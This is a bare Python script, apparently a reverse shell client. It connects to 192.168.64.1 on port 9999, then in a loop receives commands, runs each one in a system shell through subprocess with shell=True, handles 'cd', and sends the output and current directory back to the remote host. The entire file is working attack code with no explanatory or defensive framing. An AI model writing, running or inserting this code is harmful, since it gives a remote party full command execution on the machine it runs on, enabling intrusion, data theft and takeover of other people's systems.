import socket
import os
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.64.1"
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)

    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"),
                               shell=True,
                               stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        ouput_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(ouput_byte, "utf-8")
        current_dir = os.getcwd() + "$ "
        s.send(str.encode(output_str+current_dir))
        print(output_str)